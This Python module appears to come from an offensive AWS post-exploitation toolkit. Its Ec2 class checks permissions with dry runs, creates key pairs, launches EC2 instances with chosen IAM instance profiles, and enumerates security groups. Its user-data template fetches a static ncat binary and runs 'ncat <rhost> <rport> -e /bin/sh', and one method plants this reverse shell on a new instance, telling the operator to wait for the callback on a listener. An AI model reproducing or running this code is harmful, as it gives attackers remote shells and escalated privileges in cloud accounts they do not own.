from botocore.exceptions import ClientError
from os import mkdir
from time import sleep
from os.path import exists

class Ec2():

    def __init__(self, session, console):
        self.ec2 = session.client("ec2")
        self.console = console
        self.user_data_payload = f"""#!/bin/bash
sudo apt update
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat -O /tmp/ncat
chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
    
    # [START _create_key_pair]
    def _create_key_pair(self, key_name: str):
        def _create(key_name: str, dry: bool=True):
            try:
                if not dry:
                    self.console.print(f"Creating key pair named `{key_name}`.. ([bold purple]ATTENTION[/bold purple])")
                    key_pair = self.ec2.create_key_pair(
                        KeyName=key_name,
                        DryRun=dry
                    )
                    self.console.print("Creating directory: `keys` ([bold blue]CREATED DIRECTORY[/bold blue]) ")
                    if not exists("./keys"):
                        mkdir("./keys")
                    with open(f"./keys/{key_name}.pem", "w") as priv_key:
                        self.console.print(f"Writing PEM key to file: `./keys/{key_name}.pem`.. ([bold blue]CREATED FILE[/bold blue])")
                        priv_key.write(key_pair["KeyMaterial"])
                else:
                    self.ec2.create_key_pair(
                        KeyName=key_name,
                        DryRun=dry
                    )
            except ClientError as e:
                if "DryRunOperation" in str(e):
                    return True
                else:
                    return False

        success = _create(key_name)
        if success:
            self.console.print("You have the required permissions to create a key pair ([green]SUCCESS[/green])")
            if y_n := self.console.input(
                "Would you like to create the key pair? (y/n): "
            ).strip().lower() == "y":
                _create(key_name, dry=False)
            else:
                self.console.print("Adios...")
                exit(1)
        else:
            self.console.print("You do not have the required permission to create a key pair ([red]OPERATIONE FAILED[/red])")
    # [END _create_key_pair]

    # [START _run_instance]
    def _run_instance(
        self, key_name: str = "", ami_id: str = "", security_groups_ids: list = [],
        subnet_id: str = "", instance_type: str = "", instance_profile_arn: str = "",
        user_data: str = ""
        ):
        try:
            if key_name:
                results = self.ec2.run_instances(
                    ImageId=ami_id,
                    InstanceType=instance_type,
                    SecurityGroupIds=security_groups_ids,
                    IamInstanceProfile={"Arn": instance_profile_arn},
                    SubnetId=subnet_id,
                    KeyName=key_name,
                    UserData=user_data,
                    MaxCount=1,
                    MinCount=1
                )
            else:
                results = self.ec2.run_instances(
                    ImageId=ami_id,
                    InstanceType=instance_type,
                    SecurityGroupIds=security_groups_ids,
                    IamInstanceProfile={"Arn": instance_profile_arn},
                    SubnetId=subnet_id,
                    UserData=user_data,
                    MaxCount=1,
                    MinCount=1
                )
        except ClientError as e:
            self.console.log("An error occured.. ([red]ERROR[/red])")
            exit()
        self.console.print("Successfully launched Ec2 instance.. ([green]SUCCESS[/green])")
        instance_id = results["Instances"][0]["InstanceId"]
        self.console.print(' '* 3+"\u2022 Instance ID:", instance_id)
        self.console.print("Retrieving instance public IP address.. ([blue]INFO[/blue])")
        sleep(5)
        try:
            results = self.ec2.describe_instances(InstanceIds=[instance_id])
            self.console.print(' '*3+"\u2022 Public IP Address:", results["Reservations"][0]["Instances"][0]["PublicIpAddress"])
        except ClientError:
            self.console.log("An error occured while attempting to retrieve instance public IP address.. ([red]ERROR[/red])")
            exit()
    # [END _run_instance]

    # [START launch_ec2_with_instance_profile]
    def launch_ec2_with_instance_profile(
        self, key_name: str, ami_id: str, security_group_ids: list,
        subnet_id: str, instance_type: str, instance_profile_arn: str
        ):
        self._create_key_pair(key_name)
        sleep(1)
        self._run_instance(key_name, ami_id, security_group_ids, subnet_id, instance_type, instance_profile_arn)
    # [END launch_ec2_with_instance_profile]

    # [START user_data_rev_shell]
    def user_data_rev_shell(self, ami_id: str, instance_type: str, rhost: str, rport: int):
        self.console.print("Creating reverse shell user data script.. ([blue]INFO[/blue])")
        self.user_data_payload = self.user_data_payload.replace("<rhost>", rhost)
        self.user_data_payload = self.user_data_payload.replace("<rport>", str(rport))
        _tmp_payload = self.user_data_payload.replace(" && ", "\n")
        self.console.print(f"User data payload.. ([yellow]PREVIEW[/yellow])")
        self.console.print("-"*70+f"\n{_tmp_payload}\n"+"-"*70)
        self.console.print("Running instance with reverse shell user data script.. ([green]OK[/green])")
        self._run_instance(ami_id=ami_id, instance_type=instance_type, user_data=self.user_data_payload)
        self.console.print("\nCheck your TCP listener after a minute or two for a callback.. ([red]ACTION[/red])")
    # [END user_data_rev_shell]

    # [START get_instance_profiles]
    def get_instance_profiles(self):
        instance_ids = []
        profiles = []
        for profile in self.ec2.describe_iam_instance_profile_associations()["IamInstanceProfileAssociations"]:
            instance_ids.append(profile["InstanceId"])
            profiles.append(profile["IamInstanceProfile"]["Arn"])
        return list(zip(instance_ids, profiles))
    # [END get_instance_profiles]
    
    # [START get_security_groups]
    def get_security_groups(self):
        for security_group in self.ec2.describe_security_groups()["SecurityGroups"]:
            for rule in security_group["IpPermissions"]:
                cidrs = []
                descriptions = []
                protocol = rule["IpProtocol"]
                if protocol == "-1":
                    continue
                for ip_range in rule["IpRanges"]:
                    cidrs.append(ip_range["CidrIp"])
                    descriptions.append(ip_range["Description"])
            if cidrs:
                self.console.print(f"[red]SecurityGroupName[/red]: {security_group['GroupName']}")
                self.console.print("[#FFA500 underline]Rules[/#FFA500 underline]")
                self.console.print(
                    " "*3, f"\u2022 From {str(cidrs)}::{rule['FromPort']}",
                    "\u2192", f"::{rule['ToPort']}", f"([bold yellow]ALLOW[/bold yellow])\n"
                )
    # [END get_security_groups]
